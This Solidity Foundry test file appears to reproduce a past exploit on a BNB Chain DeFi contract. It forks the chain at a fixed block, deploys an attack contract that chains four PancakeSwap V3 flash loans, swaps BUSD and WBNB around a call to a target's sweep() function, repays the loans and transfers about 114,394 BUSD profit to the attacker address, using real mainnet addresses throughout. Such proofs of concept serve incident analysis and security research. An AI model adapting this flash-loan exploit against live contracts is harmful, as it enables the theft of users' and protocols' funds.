
pragma solidity ^0.8.20;

import {IERC20Like, Base} from "./Base.sol";


contract AttackTest is Base {
    address constant ATTACKER_EOA = Addresses.attacker_eoa;
    address constant ATTACK_CONTRACT = Addresses.attack_contract;
    uint256 constant FORK_BLOCK = 34114760;
    uint256 constant TX_TIMESTAMP = 1701858478;
    uint256 constant TX_BLOCK_NUMBER = 34114761;
    uint256 constant TX_VALUE = 0;

    function setUp() public {
        vm.createSelectFork(vm.envString("POC_FORK_ENDPOINT"), FORK_BLOCK);
        if (TX_TIMESTAMP != 0) vm.warp(TX_TIMESTAMP);
        if (TX_BLOCK_NUMBER != 0) vm.roll(TX_BLOCK_NUMBER);
    }

    function testPoC() public {
        vm.startPrank(ATTACKER_EOA, ATTACKER_EOA);
        OurAttack attack = _deployAttack();
        _prepareProfit(attack);
        _logBalances("Before exploit");
        _executeAttack(attack);
        _logBalances("After exploit");
        vm.stopPrank();
        _assertProfit();
    }

    function _deployAttack() internal returns (OurAttack attack) {
        if (ATTACK_CONTRACT != address(0)) {
            _etchAttackRuntime();
            attack = OurAttack(payable(ATTACK_CONTRACT));
        } else {
            attack = new OurAttack();
        }
    }

    function _prepareProfit(OurAttack attack) internal {
        _prepareProfit(address(attack), address(0));
    }

    function _executeAttack(OurAttack attack) internal {
        attack.attack{value: TX_VALUE}();
    }

    function _etchAttackRuntime() internal {

        vm.etch(ATTACK_CONTRACT, type(OurAttack).runtimeCode);
    }

    function _expectProfitLegs(address attack, address attackChild) internal override {
        attack;
        attackChild;
        _expectProfit(Addresses.attacker_eoa, address(0), Addresses.BUSD, "BUSD", 114393958203315523088130);
    }
}

contract OurAttack {
    function attack() external payable {
        _startFlashLoanChain();
    }

    function _startFlashLoanChain() internal {

        IPancakeV3Pool rootPool = IPancakeV3Pool(Addresses.PancakeV3Pool);
        IERC20Like busd = IERC20Like(Addresses.BUSD);
        rootPool.token0();
        busd.balanceOf(Addresses.PancakeV3Pool);
        busd.balanceOf(address(this));
        bytes memory callbackPayload = abi.encode(address(0), 0x00000000000000000001276FE43176d08cff7436);
        rootPool.flash(address(this), 0, 1395162144093079695488054, callbackPayload);
        busd.balanceOf(address(this));
        _collectProfit();
    }

    function _collectProfit() internal {
        uint256 profitAmount = 114393958203315523088130;
        IERC20Like(Addresses.BUSD).transfer(Addresses.attacker_eoa, profitAmount);
    }

    function flashCallback() internal {
        _callbackDone[CALLBACK_POOL_1523] = true;
        IERC20Like busd = IERC20Like(Addresses.BUSD);
        IERC20Like wbnb = IERC20Like(Addresses.WBNB);
        IPancakeRouter router = IPancakeRouter(Addresses.PancakeRouter);

        busd.balanceOf(address(this));
        busd.approve(Addresses.PancakeRouter, type(uint256).max);
        uint256 busdSwapAmount = 5439162800956148738427381;
        if (busdSwapAmount != 0) {
            if (busd.allowance(address(this), Addresses.PancakeRouter) < busdSwapAmount) {
                busd.approve(Addresses.PancakeRouter, type(uint256).max);
            }
            router.swapExactTokensForTokens(
                busdSwapAmount, 0, _addressArray2(Addresses.BUSD, Addresses.WBNB), address(this), 1701858478
            );
        }
        ISweeper(Addresses.A_8CF0A5_5740).sweep();
        wbnb.balanceOf(address(this));
        wbnb.approve(Addresses.PancakeRouter, type(uint256).max);
        uint256 wbnbSwapAmount = 13300112326793611701704;
        if (wbnbSwapAmount != 0) {
            if (wbnb.allowance(address(this), Addresses.PancakeRouter) < wbnbSwapAmount) {
                wbnb.approve(Addresses.PancakeRouter, type(uint256).max);
            }
            router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
                wbnbSwapAmount, 0, _addressArray2(Addresses.WBNB, Addresses.BUSD), address(this), 1701858478
            );
        }
        busd.balanceOf(address(this));
        busd.transfer(Addresses.PancakeV3Pool_1523, 605544437604649217436925);
    }

    function flashCallback2() internal {
        _callbackDone[CALLBACK_POOL_6687] = true;
        IERC20Like busd = IERC20Like(Addresses.BUSD);
        IPancakeV3Pool pool1523 = IPancakeV3Pool(Addresses.PancakeV3Pool_1523);

        busd.balanceOf(address(this));
        pool1523.token0();
        busd.balanceOf(Addresses.PancakeV3Pool_1523);
        busd.balanceOf(address(this));
        bytes memory callbackPayload =
            abi.encode(0x0000000000000000000000000000000000000003, 0x00000000000000000000802a398128b527BbDFb1);
        pool1523.flash(address(this), 0, 605241816696301066903473, callbackPayload);
        busd.balanceOf(address(this));
        busd.transfer(Addresses.A_85FAAC_6687, 421890629036736831856299);
    }

    function flashCallback3() internal {
        _callbackDone[CALLBACK_POOL_ROOT] = true;
        IERC20Like busd = IERC20Like(Addresses.BUSD);
        IPancakeV3Pool pool9818 = IPancakeV3Pool(Addresses.PancakeV3Pool_9818);

        busd.balanceOf(address(this));
        pool9818.token0();
        busd.balanceOf(Addresses.PancakeV3Pool_9818);
        busd.balanceOf(address(this));
        bytes memory callbackPayload =
            abi.encode(0x0000000000000000000000000000000000000001, 0x000000000000000000027ee42Ede98F84E0895DE);
        pool9818.flash(address(this), 0, 3017079051024602227054046, callbackPayload);
        busd.balanceOf(address(this));
        busd.transfer(Addresses.PancakeV3Pool, 1395301660307489003457603);
    }

    function flashCallback4() internal {
        _callbackDone[CALLBACK_POOL_9818] = true;
        IERC20Like busd = IERC20Like(Addresses.BUSD);
        IFlashPoolLike flashPool = IFlashPoolLike(Addresses.A_85FAAC_6687);

        busd.balanceOf(address(this));
        flashPool.token0();
        busd.balanceOf(Addresses.A_85FAAC_6687);
        busd.balanceOf(address(this));
        bytes memory callbackPayload =
            abi.encode(0x0000000000000000000000000000000000000002, 0x00000000000000000000594b4EA2F5867A1C2030);
        flashPool.flash(address(this), 0, 421679789142165748981808, callbackPayload);
        busd.balanceOf(address(this));
        busd.transfer(Addresses.PancakeV3Pool_9818, 3017380758929704687276752);
    }

    receive() external payable {}

    function pancakeV3FlashCallback(uint256 amount0, uint256 amount1, bytes calldata callbackData) external payable {
        amount0;
        amount1;
        callbackData;
        if (msg.sender == Addresses.PancakeV3Pool) {
            if (!_callbackDone[CALLBACK_POOL_ROOT]) flashCallback3();
            return;
        }
        if (msg.sender == Addresses.PancakeV3Pool_9818) {
            if (!_callbackDone[CALLBACK_POOL_9818]) flashCallback4();
            return;
        }
        if (msg.sender == Addresses.A_85FAAC_6687) {
            if (!_callbackDone[CALLBACK_POOL_6687]) flashCallback2();
            return;
        }
        if (msg.sender == Addresses.PancakeV3Pool_1523) {
            if (!_callbackDone[CALLBACK_POOL_1523]) flashCallback();
            return;
        }
        if (!_callbackDone[CALLBACK_POOL_ROOT]) flashCallback3();
        return;
    }

    fallback() external payable {
        if (msg.sig == 0x418aa4f1) {
            _startFlashLoanChain();
            return;
        }
    }

    bytes32 private constant CALLBACK_POOL_1523 = keccak256("poc.callback.pool1523");
    bytes32 private constant CALLBACK_POOL_6687 = keccak256("poc.callback.pool6687");
    bytes32 private constant CALLBACK_POOL_ROOT = keccak256("poc.callback.root");
    bytes32 private constant CALLBACK_POOL_9818 = keccak256("poc.callback.pool9818");
    mapping(bytes32 => bool) private _callbackDone;

    function _addressArray2(address a0, address a1) internal pure returns (address[] memory out) {
        out = new address[](2);
        out[0] = a0;
        out[1] = a1;
    }
}

library Addresses {
    address internal constant ZERO = address(0);
    address internal constant PancakeRouter = 0x10ED43C718714eb63d5aA57B78B54704E256024E;
    address internal constant Cake_LP = 0x1CEa83EC5E48D9157fCAe27a19807BeF79195Ce1;
    address internal constant PancakeV3Pool = 0x22536030B9cE783B6Ddfb9a39ac7F439f568E5e6;
    address internal constant PancakeV3Pool_1523 = 0x369482C78baD380a036cAB827fE677C1903d1523;
    address internal constant PancakeV3Pool_9818 = 0x4f3126d5DE26413AbDCF6948943FB9D0847d9818;
    address internal constant USDT = 0x55d398326f99059fF775485246999027B3197955;
    address internal constant Cake_LP_DC16 = 0x58F876857a02D6762E0101bb5C46A8c1ED44Dc16;
    address internal constant attack_contract = 0x69BD13F775505989883768ebd23D528c708D6Bcf;
    address internal constant BTCB = 0x7130d2A12B9BCbFAe4f2634d864A1Ee1Ce3Ead9c;
    address internal constant A_85FAAC_6687 = 0x85FAac652b707FDf6907EF726751087F9E0b6687;
    address internal constant USDC = 0x8AC76a51cc950d9822D68b83fE1Ad97B32Cd580d;
    address internal constant A_8CF0A5_5740 = 0x8Cf0A553aB3896e4832ebCC519a7A60828AB5740;
    address internal constant Treasury = 0xAF0980A0f52954777C491166E7F40DB2B6fBb4Fc;
    address internal constant BalancerVault = 0xBA12222222228d8Ba445958a75a0704d566BF2C8;
    address internal constant USDC_0B5C = 0xBA5Fe23f8a3a24BEd3236F05F2FcF35fd0BF0B5C;
    address internal constant WBNB = 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c;
    address internal constant attacker_eoa = 0xbbcc139933D1580e7c40442E09263e90E6F1D66D;
    address internal constant Treasury_8CE4 = 0xCb5a02BB3a38e92E591d323d6824586608cE8cE4;
    address internal constant ELEPHANT = 0xE283D0e3B8c102BAdF5E8166B73E02D96d92F688;
    address internal constant BUSD = 0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56;
    address internal constant A_FFFFFF_FFFF = 0xFFfFfFffFFfffFFfFFfFFFFFffFFFffffFfFFFfF;
}

interface IFlashPoolLike {
    function flash(address, uint256, uint256, bytes calldata) external;
    function token0() external view returns (uint256);
}

interface ISweeper {
    function sweep() external;
}

interface IPancakeRouter {
    function swapExactTokensForTokens(uint256, uint256, address[] calldata, address, uint256) external;
    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint256,
        uint256,
        address[] calldata,
        address,
        uint256
    ) external;
}

interface IPancakeV3Pool {
    function flash(address, uint256, uint256, bytes calldata) external;
    function token0() external view returns (uint256);
}
